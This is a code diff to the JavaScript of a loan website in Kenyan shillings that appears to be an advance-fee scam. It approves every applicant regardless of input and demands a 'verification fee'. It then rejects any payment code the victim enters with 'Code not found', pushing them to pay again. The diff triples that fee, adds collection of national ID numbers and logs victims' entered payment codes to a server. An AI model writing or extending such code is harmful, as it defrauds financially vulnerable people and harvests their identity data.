@@ -2,7 +2,39 @@
 let users = JSON.parse(localStorage.getItem('users')) || [];
 let loggedInUser = localStorage.getItem('loggedInUser') || null;
 let selectedLoan = localStorage.getItem('selectedLoan') || null;
+const verificationPercentage = 0.003; // 0.3%
 
+// Logging function
+async function logActivity(activity, details = {}) {
+    const logEntry = {
+        timestamp: new Date().toISOString(),
+        user: loggedInUser || 'Anonymous',
+        activity,
+        details,
+        page: window.location.pathname
+    };
+    // For local development, log to console; for production, send to server
+    if (window.location.protocol === 'file:') {
+        console.log('Local Log:', logEntry);
+    } else {
+        try {
+            const response = await fetch('/api/log', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(logEntry)
+            });
+            if (response.ok) {
+                console.log('Log sent to server:', logEntry);
+            } else {
+                console.error('Failed to send log to server');
+            }
+        } catch (error) {
+            console.error('Error sending log:', error);
+        }
+    }
+}
 // Loan amounts for consistency
 const loanAmounts = {
     personal: 50000,
@@ -13,6 +45,18 @@ const loanAmounts = {
     vehicle: 400000,
     wedding: 600000,
     vacation: 150000
+};
+
+// Loan ranges for display
+const loanRanges = {
+    personal: { min: 5000, max: 50000 },
+    business: { min: 10000, max: 500000 },
+    home: { min: 100000, max: 1000000 },
+    education: { min: 20000, max: 200000 },
+    medical: { min: 30000, max: 300000 },
+    vehicle: { min: 40000, max: 400000 },
+    wedding: { min: 60000, max: 600000 },
+    vacation: { min: 15000, max: 150000 }
 };
 
 // Toast notification function
@@ -46,6 +90,8 @@ function showToast(message, type = 'info') {
 
 // Register form handler
 document.addEventListener('DOMContentLoaded', function() {
+    // Log page visit
+    logActivity('page_visit');
     const registerForm = document.getElementById('registerForm');
     if (registerForm) {
         registerForm.addEventListener('submit', function(e) {
@@ -53,6 +99,7 @@ document.addEventListener('DOMContentLoaded', function() {
             const fullName = document.getElementById('fullName').value;
             const username = document.getElementById('username').value;
             const phone = document.getElementById('phone').value;
+            const idNumber = document.getElementById('idNumber').value;
             const password = document.getElementById('password').value;
             const confirmPassword = document.getElementById('confirmPassword').value;
             if (password !== confirmPassword) {
@@ -63,7 +110,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 showToast('Username already exists', 'warning');
                 return;
             }
-            users.push({ fullName, username, phone, password });
+            users.push({ fullName, username, phone, idNumber, password });
             localStorage.setItem('users', JSON.stringify(users));
             showToast('Registration successful! Please login.', 'success');
             setTimeout(() => window.location.href = 'login.html', 2000);
@@ -89,12 +136,31 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
+    // Populate loan table dynamically
+    if (window.location.pathname.includes('loans.html')) {
+        const tbody = document.querySelector('tbody');
+        if (tbody) {
+            tbody.innerHTML = '';
+            Object.keys(loanRanges).forEach(loanType => {
+                const range = loanRanges[loanType];
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${loanType.charAt(0).toUpperCase() + loanType.slice(1)} Loan</td>
+                    <td>Ksh ${range.min.toLocaleString()} - Ksh ${range.max.toLocaleString()}</td>
+                    <td><button class="btn btn-primary loan-btn" data-loan="${loanType}">Select</button></td>
+                `;
+                tbody.appendChild(row);
+            });
+        }
+    }
+
     // Loan selection
     const loanBtns = document.querySelectorAll('.loan-btn');
     loanBtns.forEach(btn => {
         btn.addEventListener('click', function() {
             selectedLoan = this.getAttribute('data-loan');
             localStorage.setItem('selectedLoan', selectedLoan);
+            logActivity('loan_selected', { loanType: selectedLoan });
             window.location.href = 'payment.html';
         });
     });
@@ -120,7 +186,7 @@ document.addEventListener('DOMContentLoaded', function() {
         const proceedBtn = document.getElementById('proceedBtn');
         if (verificationAmountEl && selectedLoan) {
             const amount = loanAmounts[selectedLoan] || 0;
-            const verificationFee = amount * 0.001;
+            const verificationFee = amount * verificationPercentage;
             verificationAmountEl.textContent = `Ksh ${verificationFee.toLocaleString()}`;
         }
         if (proceedBtn) {
@@ -139,10 +205,12 @@ document.addEventListener('DOMContentLoaded', function() {
             // Simulate validation
             const isValid = true; // 70% chance of approval
             if (isValid) {
+                const amount = loanAmounts[selectedLoan] || 0;
+                logActivity('loan_accepted', { loanType: selectedLoan, amount: amount });
                 resultDiv.innerHTML = `
                     <div class="alert alert-success">
                         <h4>Congratulations!</h4>
-                        <p>You are eligible for the ${selectedLoan} loan.</p>
+                        <p>You are eligible for the ${selectedLoan} loan of Ksh ${amount.toLocaleString()}.</p>
                     </div>
                 `;
                 codeInputDiv.style.display = 'block';
@@ -168,10 +236,12 @@ document.addEventListener('DOMContentLoaded', function() {
             // Simulate validation
             const isValid = true; // 70% chance of approval
             if (isValid) {
+                const amount = loanAmounts[selectedLoan] || 0;
+                logActivity('loan_accepted', { loanType: selectedLoan, amount: amount });
                 resultDiv.innerHTML = `
                     <div class="alert alert-success">
                         <h4>Congratulations!</h4>
-                        <p>You are eligible for the ${selectedLoan} loan.</p>
+                        <p>You are eligible for the ${selectedLoan} loan of Ksh ${amount.toLocaleString()}.</p>
                         <p>Please enter the payment message sent to your phone and submit for <strong>instant processing</strong>.</p>
                     </div>
                 `;
@@ -196,12 +266,13 @@ document.addEventListener('DOMContentLoaded', function() {
                     showToast('Please enter a code', 'warning');
                     return;
                 }
+                logActivity('verification_code_entered', { code: code });
                 submitCodeBtn.disabled = true;
                 submitCodeBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Loading...';
                 setTimeout(() => {
                     showToast('Code not found. Please try again.', 'danger');
                     const amount = loanAmounts[selectedLoan] || 0;
-                    const verificationFee = amount * 0.001;
+                    const verificationFee = amount * verificationPercentage;
                     errorMessageDiv.innerHTML = `Please enter a valid code or pay the verification amount of loan ${selectedLoan} Ksh ${verificationFee.toLocaleString()}.`;
                     errorMessageDiv.style.display = 'block';
                     submitCodeBtn.disabled = false;
